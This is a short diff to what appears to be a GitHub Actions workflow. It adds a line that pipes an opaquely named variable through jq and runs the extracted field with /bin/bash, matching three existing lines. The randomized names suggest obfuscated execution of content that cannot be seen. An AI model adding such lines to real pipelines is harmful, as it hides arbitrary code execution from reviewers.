@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$pt24113" | jq -r .r73818 | /bin/bash
           printf '%s' "$i54321" | jq -r .ricca16 | /bin/bash
           echo $scvx209 | jq -r .jych47 | /bin/bash
+          printf '%s' "$c3823" | jq -r .s4286 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
